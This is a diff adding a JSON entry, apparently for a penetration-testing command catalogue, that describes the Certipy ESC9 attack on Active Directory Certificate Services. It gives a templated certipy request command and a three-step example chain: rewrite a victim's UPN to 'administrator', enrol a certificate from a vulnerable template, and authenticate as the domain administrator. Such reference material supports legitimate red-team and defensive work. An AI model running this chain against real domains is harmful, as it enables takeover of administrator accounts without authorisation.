@@ -1,0 +1,21 @@
+{
+  "id": "certipy-esc9",
+  "name": "Certipy ESC9 (No Security Extension)",
+  "command": "certipy req -u '<user>@<domain>' -p '<password>' -dc-ip <dc-ip> -ca '<ca-name>' -template '<template>' -upn '<target>@<domain>'",
+  "description": "ESC9: certificate template has CT_FLAG_NO_SECURITY_EXTENSION, so the new szOID_NTDS_CA_SECURITY_EXT is not embedded. Combined with GenericWrite over a victim user, change their UPN to a target (e.g. administrator), enroll, then revert UPN and authenticate with the cert.",
+  "platform": "linux",
+  "requires": ["password"],
+  "protocols": ["ldap", "kerberos"],
+  "tags": ["certipy", "adcs", "esc9", "upn", "genericwrite"],
+  "references": [
+    { "title": "ADCS ESC9 / ESC10", "url": "https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7" }
+  ],
+  "examples": [
+    "# 1. Set victim UPN to administrator",
+    "certipy account update -u attacker@corp.local -p Pass -user victim -upn administrator",
+    "# 2. Request cert as victim",
+    "certipy req -u victim@corp.local -p VictimPass -dc-ip 10.10.10.10 -ca 'CORP-CA' -template ESC9-Template",
+    "# 3. Restore UPN and auth with cert",
+    "certipy auth -pfx administrator.pfx -domain corp.local"
+  ]
+}
